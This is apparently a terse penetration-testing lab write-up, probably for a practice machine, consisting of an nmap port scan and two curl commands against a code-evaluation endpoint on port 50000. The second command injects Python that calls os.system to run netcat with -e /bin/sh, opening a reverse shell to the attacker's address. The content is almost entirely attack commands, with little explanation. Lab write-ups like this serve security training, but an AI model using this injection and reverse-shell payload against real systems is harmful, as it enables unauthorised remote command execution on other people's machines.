PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
18000/tcp open  biimenu
50000/tcp open  ibm-db2

<img width="823" height="142" alt="image" src="https://github.com/user-attachments/assets/d5dedd76-9ca5-40fe-9305-3578241d9628" />

tested post with 2x2 and os
curl -X POST --data "code=2*2" <http://192.168.187.117:50000/verify>

posted revshell
curl -X POST --data "code=__import__('os').system('nc 192.168.45.187 80 -e /bin/sh')
<img width="767" height="86" alt="image" src="https://github.com/user-attachments/assets/002f3f76-147b-440c-a977-2d7a183cb610" />
